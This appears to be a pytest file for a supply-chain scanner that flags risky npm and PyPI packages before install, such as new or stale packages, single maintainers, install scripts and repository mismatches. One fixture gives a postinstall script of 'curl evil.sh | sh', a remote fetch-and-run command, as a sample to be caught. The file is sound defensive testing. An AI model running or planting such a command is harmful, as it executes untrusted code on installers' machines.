"""Tests for trustmcp.core.supply_chain — pre-install-only trust signals."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

from trustmcp.core import supply_chain
from trustmcp.core.registry_resolver import RegistryMetadata


def _iso(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def _metadata(**overrides) -> RegistryMetadata:
    base = dict(
        ecosystem="npm", package_name="some-pkg", resolved_version="1.0.0",
        download_url="https://registry.npmjs.org/some-pkg/-/some-pkg-1.0.0.tgz",
        repository_url=None, created=None, last_publish=None,
        maintainers_count=None, install_scripts={},
    )
    base.update(overrides)
    return RegistryMetadata(**base)


def test_very_new_package_flagged():
    metadata = _metadata(created=_iso(datetime.now(timezone.utc) - timedelta(days=2)))
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert any(f.rule_id == "preinstall.package-very-new" for f in findings)


def test_established_package_not_flagged_as_new():
    metadata = _metadata(created=_iso(datetime.now(timezone.utc) - timedelta(days=900)))
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert not any(f.rule_id == "preinstall.package-very-new" for f in findings)


def test_stale_package_flagged():
    metadata = _metadata(last_publish=_iso(datetime.now(timezone.utc) - timedelta(days=1000)))
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert any(f.rule_id == "preinstall.package-stale" for f in findings)


def test_recently_published_package_not_flagged_as_stale():
    metadata = _metadata(last_publish=_iso(datetime.now(timezone.utc) - timedelta(days=10)))
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert not any(f.rule_id == "preinstall.package-stale" for f in findings)


def test_single_npm_maintainer_flagged():
    metadata = _metadata(maintainers_count=1)
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert any(f.rule_id == "preinstall.single-maintainer" for f in findings)


def test_multiple_npm_maintainers_not_flagged():
    metadata = _metadata(maintainers_count=5)
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert not any(f.rule_id == "preinstall.single-maintainer" for f in findings)


def test_pypi_package_never_gets_a_maintainer_finding():
    # PyPI's JSON API doesn't expose a maintainer count at all — the resolver
    # leaves maintainers_count as None, so this must never fire for pypi
    # packages (it would otherwise be reporting a fake absence as a defect).
    metadata = _metadata(ecosystem="pypi", maintainers_count=None)
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert not any(f.rule_id == "preinstall.single-maintainer" for f in findings)


def test_npm_lifecycle_scripts_flagged_high_severity():
    metadata = _metadata(install_scripts={"postinstall": "curl evil.sh | sh"})
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    hits = [f for f in findings if f.rule_id == "preinstall.npm-lifecycle-script"]
    assert len(hits) == 1
    assert hits[0].severity.value == "HIGH"
    assert "postinstall" in hits[0].title


def test_no_install_scripts_not_flagged():
    metadata = _metadata(install_scripts={})
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert not any(f.rule_id == "preinstall.npm-lifecycle-script" for f in findings)


def test_offline_skips_repository_network_check_entirely(monkeypatch):
    def _fail_if_called(*args, **kwargs):
        raise AssertionError("network call attempted while offline=True")

    monkeypatch.setattr(supply_chain.httpx, "head", _fail_if_called)
    monkeypatch.setattr(supply_chain.httpx, "get", _fail_if_called)

    metadata = _metadata(repository_url="https://github.com/someorg/some-pkg")
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=True)
    assert not any(f.rule_id.startswith("preinstall.repository-") for f in findings)


def test_unreachable_repository_flagged(monkeypatch):
    class _Resp:
        status_code = 404

    monkeypatch.setattr(supply_chain.httpx, "head", lambda *a, **kw: _Resp())
    monkeypatch.setattr(supply_chain.httpx, "get", lambda *a, **kw: _Resp())

    metadata = _metadata(repository_url="https://github.com/someorg/does-not-exist")
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=False)
    assert any(f.rule_id == "preinstall.repository-unreachable" for f in findings)


def test_repository_name_mismatch_flagged(monkeypatch):
    class _Resp:
        status_code = 200

    monkeypatch.setattr(supply_chain.httpx, "head", lambda *a, **kw: _Resp())

    metadata = _metadata(package_name="totally-different-name", repository_url="https://github.com/someorg/some-pkg")
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=False)
    assert any(f.rule_id == "preinstall.repository-name-mismatch" for f in findings)


def test_repository_name_match_not_flagged(monkeypatch):
    class _Resp:
        status_code = 200

    monkeypatch.setattr(supply_chain.httpx, "head", lambda *a, **kw: _Resp())

    metadata = _metadata(package_name="some-pkg", repository_url="https://github.com/someorg/some-pkg")
    findings = supply_chain.assess_supply_chain(metadata, timeout=5, offline=False)
    assert not any(f.rule_id == "preinstall.repository-name-mismatch" for f in findings)
